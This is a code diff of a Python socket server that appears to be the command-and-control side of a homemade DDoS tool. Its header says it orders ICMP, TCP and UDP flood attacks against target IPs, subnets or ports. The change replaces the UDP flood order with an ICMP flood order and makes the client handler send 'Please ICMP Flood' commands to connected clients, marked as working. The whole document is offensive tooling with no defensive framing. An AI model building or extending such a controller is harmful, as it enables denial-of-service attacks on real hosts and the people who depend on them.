@@ -12,7 +12,7 @@
 # ONE-TO-MANY
 # 1) execute an ICMP flood attack against a given IP or subnet
 # 2) execute a TCP flood attack against an IP or port
-# 3) UDP flood attack on IP/Port
+
 
 import socket
 import threading
@@ -61,7 +61,7 @@ def ClientHandler(addr, conn):
             # conn.send(IsIPOnline(TARGET_IP, 'none')) #WORKS!
             # conn.send(IsIPOnline('none', 'nouriddin')) #WORKS!
             # conn.send(TCPFlood(TARGET_IP, TARGET_PORT))  # WORKS!
-
+            conn.send(ICMPFlood(TARGET_IP))  # WORKS!
             if msg == DISCONNECT_MSG:  # if client asks to disconnect it will disconnect
                 connected = False
     conn.close()
@@ -108,8 +108,8 @@ def TCPFlood(target_ip, port_num):
     return f"[TCPF] Please TCP Flood {target_ip} at Port number {port_num}".encode(FORMAT)
 
 
-def UDPFlood(target_ip, port_num):
-    return f"[UDPF] Please UDP Flood {target_ip} at Port number {port_num}".encode(FORMAT)
+def ICMPFlood(target_ip):
+    return f"[ICMP] Please ICMP Flood {target_ip}".encode(FORMAT)
 
 
 print("initializing server...")
